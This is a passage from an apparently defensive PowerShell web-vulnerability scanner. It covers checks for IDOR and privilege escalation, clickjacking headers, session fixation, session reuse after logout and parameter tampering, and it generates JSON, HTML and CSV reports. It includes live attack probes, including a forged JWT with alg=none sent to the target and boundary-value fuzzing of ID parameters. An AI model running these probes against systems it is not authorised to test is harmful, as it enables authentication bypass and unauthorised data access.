                    Write-Danger "PRIVILEGE ESCALATION: Regular user accessing admin endpoint!"
                    
                    $privilegeEscalations += $endpoint.Path
                    
                    Add-Issue -severity "Critical" `
                        -title "Broken Access Control - Vertical Privilege Escalation" `
                        -description "Non-admin user (ID: $myUserId) can access admin-only endpoint $($endpoint.Path). Server returned 200 OK, indicating insufficient role-based access control." `
                        -url $fullUrl `
                        -remediation "Implement role-based access control (RBAC). Check user role before granting access to admin functions." `
                        -whyItMatters "Regular users can perform administrative actions like viewing all users, changing configurations, accessing financial data, or deleting accounts. This is a complete security breakdown." `
                        -suggestedFix "1. Add role/permission check: IF user.role != 'admin' THEN return 403. 2. Use centralized authorization middleware. 3. Apply principle of least privilege. 4. Audit all admin endpoints for proper role enforcement." `
                        -category "Access Control" `
                        -cweId "CWE-269" `
                        -issueType "PrivilegeEscalation" `
                        -confidence "High" `
                        -evidence @{
                            UserId = $myUserId
                            AdminEndpoint = $endpoint.Path
                            ExpectedRole = "admin"
                            ActualRole = "user"
                        }
                }
                
                # Success case: accessing own data
                if ($endpoint.IsMine -eq $true) {
                    Write-Success "Can access own data (expected behavior)"
                }
            }
            elseif ($authResult.StatusCode -eq 403) {
                if ($endpoint.IsMine -eq $false -or $endpoint.RequiresAdmin) {
                    Write-Success "Properly blocks access (403 Forbidden) - good authorization"
                }
                else {
                    Write-Warning "403 Forbidden when accessing own data (may be role issue)"
                }
            }
            elseif ($authResult.StatusCode -eq 401) {
                Write-Warning "401 Unauthorized despite sending session cookie (session may be invalid)"
            }
            else {
                Write-Debug "Authenticated access: Status $($authResult.StatusCode)"
            }
        }
        
        if ($script:AggressiveAccess) {
            Start-Sleep -Milliseconds 150  # Extra delay in WAF-heavy environment
        }
    }
    
    # Summary
    Write-Host ""
    if ($hasAuth) {
        $totalIssues = $anonymousAccessCount + $idorVulnerabilities.Count + $privilegeEscalations.Count
        
        if ($totalIssues -gt 0) {
            Write-Danger "ACCESS CONTROL SUMMARY (Authenticated Mode):"
            if ($anonymousAccessCount -gt 0) {
                Write-Danger "  - $anonymousAccessCount endpoint(s) accessible anonymously"
            }
            if ($idorVulnerabilities.Count -gt 0) {
                Write-Danger "  - $($idorVulnerabilities.Count) IDOR vulnerability(ies): $($idorVulnerabilities -join ', ')"
            }
            if ($privilegeEscalations.Count -gt 0) {
                Write-Danger "  - $($privilegeEscalations.Count) privilege escalation(s): $($privilegeEscalations -join ', ')"
            }
        }
        else {
            Write-Success "ACCESS CONTROL SUMMARY: No exploitable access control issues detected with authenticated testing"
        }
    }
    else {
        if ($anonymousAccessCount -gt 0) {
            Write-Danger "ACCESS CONTROL SUMMARY: $anonymousAccessCount endpoint(s) accessible anonymously"
            Write-Warning "Vulnerable: $($vulnerableEndpoints -join ', ')"
        }
        else {
            Write-Success "ACCESS CONTROL SUMMARY: No anonymous access to tested endpoints"
        }
        Write-Info "For full IDOR testing, provide: -SessionCookie 'session=...' -AuthUserId 123"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 24: DEDICATED CLICKJACKING PROTECTION TEST
# ============================================================================
function Test-Clickjacking {
    Start-SecurityTest "Clickjacking Protection Analysis" "24"
    
    $result = @{
        Name = "Clickjacking"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            XFrameOptions = $false
            CSPFrameAncestors = $false
            Protected = $false
        }
    }
    
    try {
        Write-Info "Analyzing clickjacking protection mechanisms..."
        
        $response = Invoke-SafeWebRequest -uri $site -method "GET"
        
        if ($response.Success) {
            $xfo = $response.Headers['X-Frame-Options']
            $csp = $response.Headers['Content-Security-Policy']
            
            # Check X-Frame-Options
            if ($xfo -and ($xfo -match "DENY|SAMEORIGIN")) {
                Write-Success ("X-Frame-Options present: " + $xfo)
                $result.Metrics.XFrameOptions = $true
                $result.Metrics.Protected = $true
            }
            else {
                Write-Warning "Missing X-Frame-Options header"
                Add-Issue -severity "Medium" `
                    -title "Missing Security Header: X-Frame-Options" `
                    -description "X-Frame-Options header is not set, allowing site to be framed by any origin" `
                    -whyItMatters "Attackers can embed your site in malicious iframes (clickjacking attacks). Users think they're clicking on the attacker's page but are actually interacting with your application, leading to unintended actions like fund transfers or account changes." `
                    -suggestedFix "Add 'X-Frame-Options: DENY' header to prevent all framing, or 'X-Frame-Options: SAMEORIGIN' to allow framing only by same origin." `
                    -url $site `
                    -issueType "Clickjacking" `
                    -confidence "High"
            }
            
            # Check CSP frame-ancestors
            if ($csp -and ($csp -match "frame-ancestors")) {
                Write-Success "CSP frame-ancestors directive present"
                $result.Metrics.CSPFrameAncestors = $true
                $result.Metrics.Protected = $true
            }
            else {
                Write-Warning "CSP frame-ancestors directive missing"
            }
            
            # Overall protection status
            if ($result.Metrics.Protected) {
                Write-Success "Clickjacking protection is active"
            }
            else {
                Write-Danger "No clickjacking protection detected - site is vulnerable to UI redressing attacks"
            }
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger ("Clickjacking test failed: " + $_)
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# FINAL REPORT GENERATION
# ============================================================================
function Generate-FinalReport {
    Write-Section "FINAL SECURITY REPORT"
    
    $script:scanStats.EndTime  = Get-Date
    $script:scanStats.Duration = ($script:scanStats.EndTime - $script:scanStats.StartTime).TotalSeconds
    
    $totalIssues = ($script:issues.Values | ForEach-Object { $_.Count } | Measure-Object -Sum).Sum
    
    # Console summary
    Write-Host ("Target: " + $site) -ForegroundColor Cyan
    Write-Host ("Scan Duration: " + [math]::Round($script:scanStats.Duration, 2) + " seconds") -ForegroundColor Cyan
    Write-Host ("Tests Run: " + $script:scanStats.TestsRun) -ForegroundColor Cyan
    Write-Host ("Requests Made: " + $script:scanStats.RequestsMade) -ForegroundColor Cyan
    Write-Host ""
    
    # Issue summary
    Write-Host "ISSUE SUMMARY:" -ForegroundColor Magenta
    Write-Host ("  CRITICAL: " + $script:issues.Critical.Count) -ForegroundColor Red
    Write-Host ("  HIGH:     " + $script:issues.High.Count) -ForegroundColor Red
    Write-Host ("  MEDIUM:   " + $script:issues.Medium.Count) -ForegroundColor Yellow
    Write-Host ("  LOW:      " + $script:issues.Low.Count) -ForegroundColor Yellow
    Write-Host ("  INFO:     " + $script:issues.Info.Count) -ForegroundColor Cyan

    # ASCII-only divider so PowerShell doesn't choke on Unicode if file encoding shifts
    Write-Host ("  ----------------") -ForegroundColor Gray

    # dynamic color for TOTAL
    $totalColor = if ($totalIssues -eq 0) {
        "Green"
    } elseif ($script:issues.Critical.Count -gt 0) {
        "Red"
    } else {
        "Yellow"
    }
    Write-Host ("  TOTAL:    " + $totalIssues) -ForegroundColor $totalColor
    Write-Host ""
    
    # ========================================================================
    # EXECUTIVE SUMMARY - Detailed findings by severity
    # ========================================================================
    Write-Host "=" * 80 -ForegroundColor Cyan
    Write-Host "EXECUTIVE SUMMARY - DETAILED FINDINGS" -ForegroundColor Cyan
    Write-Host "=" * 80 -ForegroundColor Cyan
    Write-Host ""
    
    # Helper function to display issue details
    function Show-IssueDetails {
        param($issueList, $severityLabel, $color)
        
        if ($issueList.Count -gt 0) {
            Write-Host "$severityLabel SEVERITY FINDINGS ($($issueList.Count)):" -ForegroundColor $color
            Write-Host ("-" * 80) -ForegroundColor Gray
            
            $issueNum = 1
            foreach ($issue in $issueList) {
                Write-Host ""
                Write-Host "[$issueNum/$($issueList.Count)] $($issue.Title)" -ForegroundColor $color
                
                if ($issue.IssueType) {
                    Write-Host "  Type: $($issue.IssueType)" -ForegroundColor DarkGray
                }
                
                Write-Host "  Description: $($issue.Description)" -ForegroundColor Gray
                
                if ($issue.URL) {
                    Write-Host "  Affected URL: $($issue.URL)" -ForegroundColor DarkCyan
                }
                
                if ($issue.WhyItMatters) {
                    Write-Host "  Why It Matters: $($issue.WhyItMatters)" -ForegroundColor Yellow
                }
                
                if ($issue.SuggestedFix) {
                    Write-Host "  Suggested Fix: $($issue.SuggestedFix)" -ForegroundColor Green
                } elseif ($issue.Remediation) {
                    Write-Host "  Remediation: $($issue.Remediation)" -ForegroundColor Green
                }
                
                if ($issue.OWASP) {
                    Write-Host "  OWASP: $($issue.OWASP)" -ForegroundColor Magenta
                }
                
                if ($issue.CWE) {
                    Write-Host "  CWE: $($issue.CWE)" -ForegroundColor Magenta
                }
                
                $issueNum++
            }
            Write-Host ""
        }
    }
    
    # Display issues by severity (highest first)
    Show-IssueDetails -issueList $script:issues.Critical -severityLabel "CRITICAL" -color "Red"
    Show-IssueDetails -issueList $script:issues.High -severityLabel "HIGH" -color "Red"
    Show-IssueDetails -issueList $script:issues.Medium -severityLabel "MEDIUM" -color "Yellow"
    Show-IssueDetails -issueList $script:issues.Low -severityLabel "LOW" -color "Yellow"
    Show-IssueDetails -issueList $script:issues.Info -severityLabel "INFORMATIONAL" -color "Cyan"
    
    Write-Host "=" * 80 -ForegroundColor Cyan
    Write-Host ""
    
    # ========================================================================
    # Quick reference - Critical issues only
    # ========================================================================
    if ($script:issues.Critical.Count -gt 0) {
        Write-Host "CRITICAL ISSUES (IMMEDIATE ACTION REQUIRED):" -ForegroundColor Red
        foreach ($issue in $script:issues.Critical) {
            Write-Host ("  X " + $issue.Title) -ForegroundColor Red
            Write-Host ("    " + $issue.Description) -ForegroundColor Gray
            if ($issue.URL) {
                Write-Host ("    URL: " + $issue.URL) -ForegroundColor DarkGray
            }
        }
        Write-Host ""
    }
    
    # Risk score calculation
    $riskScore = ($script:issues.Critical.Count * 10) +
                 ($script:issues.High.Count * 7) +
                 ($script:issues.Medium.Count * 4) +
                 ($script:issues.Low.Count * 1)
    
    $riskColor = if ($riskScore -gt 50) {
        "Red"
    } elseif ($riskScore -gt 20) {
        "Yellow"
    } else {
        "Green"
    }
    Write-Host ("OVERALL RISK SCORE: " + $riskScore) -ForegroundColor $riskColor
    Write-Host ""
    
    # Build report data for JSON
    $reportData = @{
        ScanInfo = @{
            Target        = $site
            ScanID        = $scanId
            StartTime     = $script:scanStats.StartTime
            EndTime       = $script:scanStats.EndTime
            Duration      = $script:scanStats.Duration
            TestsRun      = $script:scanStats.TestsRun
            RequestsMade  = $script:scanStats.RequestsMade
        }
        Summary = @{
            TotalIssues = $totalIssues
            Critical    = $script:issues.Critical.Count
            High        = $script:issues.High.Count
            Medium      = $script:issues.Medium.Count
            Low         = $script:issues.Low.Count
            Info        = $script:issues.Info.Count
            RiskScore   = $riskScore
        }
        Issues      = $script:issues
        TestResults = $script:testResults
    }
    
    # Write JSON report
    $reportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonReport -Encoding UTF8
    Write-Success "JSON report saved: $jsonReport"
    
    # Optionally write HTML
    if ($htmlReport) {
        Generate-HTMLReport
        Write-Success "HTML report saved: $htmlReportPath"
    }
    
    # Always write CSV
    Generate-CSVReport
    Write-Success "CSV report saved: $csvReport"
    
    Write-Host ""
    Write-Host "RECOMMENDATIONS:" -ForegroundColor Cyan

    # Build dynamic recommendations based on actual findings
    $recommendations = @()
    $recNum = 1
    
    # Critical issues first
    if ($script:issues.Critical.Count -gt 0) {
        $recommendations += "$recNum. Address all $($script:issues.Critical.Count) CRITICAL issues immediately"
        $recNum++
    }
    
    # High issues next
    if ($script:issues.High.Count -gt 0) {
        $recommendations += "$recNum. Fix $($script:issues.High.Count) HIGH severity issues as priority"
        $recNum++
    }
    
    # Common security recommendations
    $commonRecs = @(
        "Implement security headers (CSP, HSTS, X-Frame-Options)",
        "Add rate limiting and brute force protection",
        "Use parameterized queries to prevent SQL injection",
        "Implement output encoding to prevent XSS",
        "Restrict access to sensitive files and admin panels",
        "Enable HTTPS and force redirect from HTTP",
        "Keep all software and dependencies updated",
        "Implement Web Application Firewall (WAF)",
        "Add security.txt for vulnerability disclosure",
        "Regular security audits and penetration testing",
        "Implement comprehensive logging and monitoring"
    )
    
    foreach ($rec in $commonRecs) {
        $recommendations += "$recNum. $rec"
        $recNum++
    }
    
    foreach ($rec in $recommendations) {
        Write-Host ("  " + $rec) -ForegroundColor Gray
    }
    
    Write-Host ""
    Write-Host "Scan complete! Review the reports for detailed findings." -ForegroundColor Green
    
    if ($env:OS -match "Windows") {
        Write-Host "Opening text log..." -ForegroundColor Yellow
        Start-Sleep -Seconds 1
        notepad $logFile
    }
}

# ============================================================================
# HTML REPORT GENERATION
# ============================================================================
function Generate-HTMLReport {
    $totalIssues = ($script:issues.Values | ForEach-Object { $_.Count } | Measure-Object -Sum).Sum
    $riskScore = ($script:issues.Critical.Count * 10) +
                 ($script:issues.High.Count * 7) +
                 ($script:issues.Medium.Count * 4) +
                 ($script:issues.Low.Count * 1)
    
    $htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Scan Report - $site</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; color: #333; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
        header h1 { font-size: 2.5em; margin-bottom: 10px; }
        header p { font-size: 1.1em; opacity: 0.9; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .stat-card h3 { font-size: 0.9em; color: #666; text-transform: uppercase; margin-bottom: 10px; }
        .stat-card .value { font-size: 2.5em; font-weight: bold; }
        .stat-card.critical .value { color: #dc3545; }
        .stat-card.high .value { color: #fd7e14; }
        .stat-card.medium .value { color: #ffc107; }
        .stat-card.low .value { color: #17a2b8; }
        .stat-card.info .value { color: #6c757d; }
        .stat-card.risk .value { font-size: 3em; }
        .section { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .section h2 { color: #667eea; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #667eea; }
        .issue { background: #f8f9fa; padding: 15px; border-left: 4px solid #6c757d; margin-bottom: 15px; border-radius: 4px; }
        .issue.critical { border-left-color: #dc3545; background: #f8d7da; }
        .issue.high { border-left-color: #fd7e14; background: #fff3cd; }
        .issue.medium { border-left-color: #ffc107; background: #fff3cd; }
        .issue.low { border-left-color: #17a2b8; background: #d1ecf1; }
        .issue h3 { margin-bottom: 10px; display: flex; align-items: center; }
        .issue .severity { display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 0.75em; font-weight: bold; text-transform: uppercase; margin-right: 10px; }
        .severity.critical { background: #dc3545; color: white; }
        .severity.high { background: #fd7e14; color: white; }
        .severity.medium { background: #ffc107; color: black; }
        .severity.low { background: #17a2b8; color: white; }
        .issue p { margin: 8px 0; color: #555; }
        .issue .url { font-family: monospace; background: #e9ecef; padding: 8px; border-radius: 3px; word-break: break-all; font-size: 0.9em; }
        .remediation { background: #d4edda; border-left: 4px solid #28a745; padding: 10px; margin-top: 10px; border-radius: 3px; }
        .remediation strong { color: #155724; }
        .test-results { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
        .test-result { background: #f8f9fa; padding: 15px; border-radius: 5px; border-left: 3px solid #28a745; }
        .test-result.failed { border-left-color: #dc3545; }
        .test-result h4 { margin-bottom: 8px; }
        .test-result .test-number { color: #667eea; font-weight: bold; }
        footer { text-align: center; padding: 20px; color: #666; margin-top: 30px; }
        .risk-meter { width: 100%; height: 30px; background: linear-gradient(to right, #28a745 0%, #ffc107 50%, #dc3545 100%); border-radius: 15px; position: relative; overflow: hidden; }
        .risk-indicator { position: absolute; top: 0; height: 100%; width: 3px; background: black; }
        @media print { body { background: white; } .container { max-width: none; } }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Security Scan Report</h1>
            <p><strong>Target:</strong> $site</p>
            <p><strong>Scan Date:</strong> $($script:scanStats.StartTime)</p>
            <p><strong>Scan ID:</strong> $scanId</p>
            <p><strong>Duration:</strong> $([math]::Round($script:scanStats.Duration, 2)) seconds</p>
        </header>

        <div class="stats">
            <div class="stat-card critical">
                <h3>Critical</h3>
                <div class="value">$($script:issues.Critical.Count)</div>
            </div>
            <div class="stat-card high">
                <h3>High</h3>
                <div class="value">$($script:issues.High.Count)</div>
            </div>
            <div class="stat-card medium">
                <h3>Medium</h3>
                <div class="value">$($script:issues.Medium.Count)</div>
            </div>
            <div class="stat-card low">
                <h3>Low</h3>
                <div class="value">$($script:issues.Low.Count)</div>
            </div>
            <div class="stat-card risk">
                <h3>Risk Score</h3>
                <div class="value">$riskScore</div>
            </div>
        </div>

        <div class="section">
            <h2>Executive Summary</h2>
            <p>A comprehensive security assessment was performed on <strong>$site</strong> using $($script:scanStats.TestsRun) different security tests.</p>
            <p><strong>Total Issues Found:</strong> $totalIssues</p>
            <p><strong>Requests Made:</strong> $($script:scanStats.RequestsMade)</p>
            <p><strong>Risk Level:</strong> $(if ($riskScore -gt 50) { "HIGH" } elseif ($riskScore -gt 20) { "MEDIUM" } else { "LOW" })</p>
        </div>
"@

    # Critical issues
    if ($script:issues.Critical.Count -gt 0) {
        $htmlContent += @"
        <div class="section">
            <h2>Critical Issues (Immediate Action Required)</h2>
"@
        foreach ($issue in $script:issues.Critical) {
            $htmlContent += @"
            <div class="issue critical">
                <h3><span class="severity critical">Critical</span>$($issue.Title)</h3>
                <p><strong>Description:</strong> $($issue.Description)</p>
"@
            if ($issue.URL) {
                $htmlContent += "<p><strong>URL:</strong></p><div class='url'>$($issue.URL)</div>"
            }
            if ($issue.Remediation) {
                $htmlContent += "<div class='remediation'><strong>Remediation:</strong> $($issue.Remediation)</div>"
            }
            $htmlContent += "</div>"
        }
        $htmlContent += "</div>"
    }

    # High issues
    if ($script:issues.High.Count -gt 0) {
        $htmlContent += @"
        <div class="section">
            <h2>High Priority Issues</h2>
"@
        foreach ($issue in $script:issues.High) {
            $htmlContent += @"
            <div class="issue high">
                <h3><span class="severity high">High</span>$($issue.Title)</h3>
                <p><strong>Description:</strong> $($issue.Description)</p>
"@
            if ($issue.URL) {
                $htmlContent += "<p><strong>URL:</strong></p><div class='url'>$($issue.URL)</div>"
            }
            if ($issue.Remediation) {
                $htmlContent += "<div class='remediation'><strong>Remediation:</strong> $($issue.Remediation)</div>"
            }
            $htmlContent += "</div>"
        }
        $htmlContent += "</div>"
    }

    # Medium issues
    if ($script:issues.Medium.Count -gt 0) {
        $htmlContent += @"
        <div class="section">
            <h2>Medium Priority Issues</h2>
"@
        foreach ($issue in $script:issues.Medium) {
            $htmlContent += @"
            <div class="issue medium">
                <h3><span class="severity medium">Medium</span>$($issue.Title)</h3>
                <p><strong>Description:</strong> $($issue.Description)</p>
"@
            if ($issue.URL) {
                $htmlContent += "<p><strong>URL:</strong></p><div class='url'>$($issue.URL)</div>"
            }
            if ($issue.Remediation) {
                $htmlContent += "<div class='remediation'><strong>Remediation:</strong> $($issue.Remediation)</div>"
            }
            $htmlContent += "</div>"
        }
        $htmlContent += "</div>"
    }

    # Test results
    $htmlContent += @"
        <div class="section">
            <h2>Test Results</h2>
            <div class="test-results">
"@
    
    foreach ($testName in $script:testResults.Keys) {
        $test = $script:testResults[$testName]
        $statusClass = if ($test.Status -eq "Completed") { "" } else { "failed" }
        $htmlContent += @"
            <div class="test-result $statusClass">
                <h4><span class="test-number">Test $($test.Number):</span> $testName</h4>
                <p><strong>Status:</strong> $($test.Status)</p>
                <p><strong>Duration:</strong> $([math]::Round($test.Duration, 2))s</p>
            </div>
"@
    }
    
    $htmlContent += @"
            </div>
        </div>

        <footer>
            <p>Generated by Advanced Security Testing Suite v2.0</p>
            <p>Report generated on $($script:scanStats.EndTime)</p>
        </footer>
    </div>
</body>
</html>
"@
    $htmlContent | Out-File -FilePath $htmlReportPath -Encoding UTF8
}

# ============================================================================
# CSV REPORT GENERATION
# ============================================================================
function Generate-CSVReport {
    $csvData = @()
    
    foreach ($severity in @("Critical", "High", "Medium", "Low", "Info")) {
        foreach ($issue in $script:issues[$severity]) {
            $csvData += [PSCustomObject]@{
                Severity     = $severity
                Title        = $issue.Title
                Description  = $issue.Description
                URL          = $issue.URL
                Remediation  = $issue.Remediation
                TestNumber   = $issue.TestNumber
                Timestamp    = $issue.Timestamp
                CVE          = $issue.CVE
                CVSS         = $issue.CVSS
            }
        }
    }
    
    $csvData | Export-Csv -Path $csvReport -NoTypeInformation -Encoding UTF8
}

# ============================================================================
# TEST 30: SESSION SECURITY & TOKEN VALIDATION
# ============================================================================
function Test-SessionSecurity {
    Start-SecurityTest "Session Security & Token Validation" "30"
    
    if (-not $script:authState.IsAuthenticated) {
        Write-Info "Session security testing requires authentication"
        Write-Info "Provide: -SessionCookie 'session=...' or -Username/-Password"
        Complete-SecurityTest "Skipped"
        return
    }
    
    Write-Info "Testing session management and token security..."
    
    try {
        # TEST 1: Session Fixation Check
        Write-Info "Test 1: Checking for session fixation vulnerability..."
        
        $initialCookies = $script:authState.SessionCookies.Clone()
        $initialSessionId = $null
        
        foreach ($cookieVal in $initialCookies.Values) {
            if ($cookieVal -match '([^=]+)=([^;]+)') {
                $initialSessionId = $Matches[2]
                break
            }
        }
        
        if ($initialSessionId) {
            Write-Info "Initial session ID detected: $($initialSessionId.Substring(0, [Math]::Min(16, $initialSessionId.Length)))..."
            
            # If we have username/password, re-login and check if session changes
            if ($Username -and $Password -and $LoginUrl) {
                Write-Info "Re-authenticating to check if session ID changes..."
                
                $reloginResult = Initialize-Authentication
                
                if ($reloginResult) {
                    $newSessionId = $null
                    foreach ($cookieVal in $script:authState.SessionCookies.Values) {
                        if ($cookieVal -match '([^=]+)=([^;]+)') {
                            $newSessionId = $Matches[2]
                            break
                        }
                    }
                    
                    if ($newSessionId -and $newSessionId -eq $initialSessionId) {
                        Write-Danger "SESSION FIXATION VULNERABILITY: Session ID unchanged after re-login!"
                        
                        Add-Issue -severity "High" `
                            -title "Session Fixation Vulnerability" `
                            -description "Session ID does not regenerate after successful authentication. Attacker can fixate victim's session ID before login, then hijack session after victim authenticates." `
                            -remediation "Regenerate session ID immediately after successful login. Call session_regenerate_id(true) in PHP, request.session.regenerate() in Express.js, or framework equivalent." `
                            -whyItMatters "Attacker can: 1) Get victim to use attacker's session ID (via URL or cookie injection), 2) Wait for victim to log in, 3) Use the same session ID to access victim's authenticated session. This bypasses password authentication entirely." `
                            -category "Session Management" `
                            -cweId "CWE-384" `
                            -confidence "High"
                    } else {
                        Write-Success "Session ID regenerated after login (protection working)"
                    }
                }
            } else {
                Write-Info "Cannot test session fixation without username/password (need fresh login)"
            }
        }
        
        # TEST 2: Token Reuse After Logout
        Write-Info "Test 2: Testing session invalidation on logout..."
        
        $logoutEndpoints = @("/logout", "/api/logout", "/auth/logout", "/signout", "/api/auth/logout")
        $logoutTested = $false
        
        foreach ($logoutEndpoint in $logoutEndpoints) {
            $logoutUrl = $site + $logoutEndpoint
            $logoutResult = Invoke-SafeWebRequest -uri $logoutUrl -method "POST" -useAuth $true -timeoutSec 5
            
            if ($logoutResult.StatusCode -in @(200, 201, 204, 302, 303)) {
                Write-Info "Logout endpoint found: $logoutEndpoint (Status: $($logoutResult.StatusCode))"
                $logoutTested = $true
                
                # Wait a moment for server-side session cleanup
                Start-Sleep -Seconds 2
                
                # Try to access protected resource with old session
                $protectedEndpoints = @("/user/profile", "/dashboard", "/api/user", "/account", "/settings")
                
                foreach ($endpoint in $protectedEndpoints) {
                    $testUrl = $site + $endpoint
                    $replayResult = Invoke-SafeWebRequest -uri $testUrl -method "GET" -useAuth $true -timeoutSec 5
                    
                    if ($replayResult.Success -and $replayResult.StatusCode -eq 200) {
                        Write-Danger "SESSION TOKEN STILL VALID AFTER LOGOUT: $endpoint"
                        
                        Add-Issue -severity "Critical" `
                            -title "Session Not Invalidated on Logout" `
                            -description "Session cookie remains valid after logout. Tested $endpoint with session cookie after calling $logoutEndpoint - still received 200 OK. Session was not destroyed server-side." `
                            -remediation "Invalidate session server-side on logout: session_destroy() (PHP), req.session.destroy() (Express), or database/Redis session deletion. Clear session cookie: Set-Cookie with Max-Age=0." `
                            -whyItMatters "If user logs out on shared computer, next person can press browser back button and access their session. Stolen session cookies remain valid indefinitely. User cannot revoke compromised sessions." `
                            -url $testUrl `
                            -category "Session Management" `
                            -cweId "CWE-613" `
                            -confidence "Confirmed" `
                            -evidence @{
                                LogoutEndpoint = $logoutEndpoint
                                TestedEndpoint = $endpoint
                                StatusAfterLogout = $replayResult.StatusCode
                                SessionStillValid = $true
                            }
                        
                        break
                    } elseif ($replayResult.StatusCode -in @(401, 403)) {
                        Write-Success "Session correctly invalidated (received $($replayResult.StatusCode) after logout)"
                    }
                }
                
                break
            }
        }
        
        if (-not $logoutTested) {
            Write-Info "No logout endpoint found - manual verification recommended"
        }
        
        # TEST 3: JWT Token Tampering (if JWT detected)
        Write-Info "Test 3: Checking for JWT tokens..."
        
        $jwtDetected = $false
        foreach ($cookieVal in $script:authState.SessionCookies.Values) {
            # JWT format: xxxxx.yyyyy.zzzzz (base64url encoded)
            if ($cookieVal -match '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+') {
                $jwtDetected = $true
                $jwtToken = $Matches[0]
                
                Write-Info "JWT token detected in session cookie"
                
                # Try alg=none attack
                try {
                    $parts = $jwtToken.Split('.')
                    if ($parts.Count -eq 3) {
                        # Decode header
                        $headerB64 = $parts[0]
                        $headerBytes = [Convert]::FromBase64String($headerB64 + "==")
                        $headerJson = [System.Text.Encoding]::UTF8.GetString($headerBytes)
                        
                        Write-Info "JWT Header: $headerJson"
                        
                        # Create alg=none version
                        $noneHeader = '{"alg":"none","typ":"JWT"}'
                        $noneHeaderB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($noneHeader)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
                        
                        $tamperedJWT = "$noneHeaderB64.$($parts[1])."
                        
                        Write-Info "Testing JWT alg=none bypass attack..."
                        
                        # Test with tampered JWT
                        $testHeaders = @{
                            "Authorization" = "Bearer $tamperedJWT"
                        }
                        
                        $jwtTestResult = Invoke-SafeWebRequest -uri ($site + "/api/user") -method "GET" -headers $testHeaders -timeoutSec 5
                        
                        if ($jwtTestResult.Success -and $jwtTestResult.StatusCode -eq 200) {
                            Write-Danger "JWT ALG=NONE BYPASS SUCCESSFUL!"
                            
                            Add-Issue -severity "Critical" `
                                -title "JWT alg=none Bypass Vulnerability" `
                                -description "Application accepts JWT tokens with alg=none (no signature). Successfully bypassed signature verification by setting algorithm to 'none' and removing signature." `
                                -remediation "Explicitly reject tokens with alg=none. Use strong signing algorithms (RS256, ES256). Validate algorithm matches expected value before verification." `
                                -whyItMatters "Attacker can forge arbitrary JWT tokens without knowing signing key. Can impersonate any user, escalate privileges, bypass authentication entirely. This is a complete authentication bypass." `
                                -category "Authentication" `
                                -cweId "CWE-347" `
                                -confidence "Confirmed"
                        } else {
                            Write-Success "JWT alg=none protection working (rejected tampered token)"
                        }
                    }
                }
                catch {
                    Write-Info "JWT tampering test failed: $_"
                }
                
                break
            }
        }
        
        if (-not $jwtDetected) {
            Write-Info "No JWT tokens detected (session uses cookies or other mechanism)"
        }
        
        # TEST 4: Session Timeout Check
        Write-Info "Test 4: Session timeout testing..."
        Write-Info "Note: Full timeout testing requires waiting (5-30 minutes) - skipped for scan speed"
        Write-Info "Manual verification recommended: Leave session idle for 15-30 minutes, then test access"
        
        # TEST 5: Concurrent Session Handling
        Write-Info "Test 5: Concurrent session limits..."
        Write-Info "Note: Requires multiple authentication sources - manual verification recommended"
        Write-Info "Test: Log in from 2+ devices, check if old session is invalidated"
        
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Session security test failed: $_"
        Complete-SecurityTest "Failed"
    }
}

# ============================================================================
# TEST 31: PARAMETER TAMPERING & MASS ASSIGNMENT
# ============================================================================
function Test-ParameterTampering {
    Start-SecurityTest "Parameter Tampering & Mass Assignment" "31"
    
    Write-Info "Testing parameter manipulation and privilege escalation..."
    
    try {
        # Common API endpoints to test
        $testEndpoints = @(
            @{Path = "/api/user"; Param = "id"; Method = "GET"},
            @{Path = "/api/users"; Param = "id"; Method = "GET"},
            @{Path = "/api/order"; Param = "id"; Method = "GET"},
            @{Path = "/api/orders"; Param = "id"; Method = "GET"},
            @{Path = "/api/booking"; Param = "id"; Method = "GET"},
            @{Path = "/api/profile"; Param = "userId"; Method = "GET"}
        )
        
        # TEST 1: Numeric Boundary Testing
        Write-Info "Test 1: Numeric boundary fuzzing..."
        
        $boundaryValues = @(0, -1, -999, 999999, 2147483647, "null", "undefined", "[]", "{}")
        $vulnerableEndpoints = @()
        
        foreach ($endpoint in $testEndpoints) {
            $basePath = $site + $endpoint.Path
            
            # First, test with valid value
            $validUrl = "$basePath?$($endpoint.Param)=1"
            $validResult = Invoke-SafeWebRequest -uri $validUrl -method $endpoint.Method -useAuth $true -timeoutSec 5
            
            if ($validResult.Success) {
                foreach ($value in $boundaryValues) {
                    $testUrl = "$basePath?$($endpoint.Param)=$value"
                    $testResult = Invoke-SafeWebRequest -uri $testUrl -method $endpoint.Method -useAuth $true -timeoutSec 5
                    
                    # Check for unexpected behavior
                    if ($testResult.StatusCode -eq 200 -and $value -in @(-1, 0, "null")) {
                        Write-Warning "Suspicious: $testUrl returned 200 (may expose unauthorized data)"
                        $vulnerableEndpoints += @{
                            Endpoint = $endpoint.Path
                            Parameter = $endpoint.Param
                            Value = $value
                            StatusCode = $testResult.StatusCode
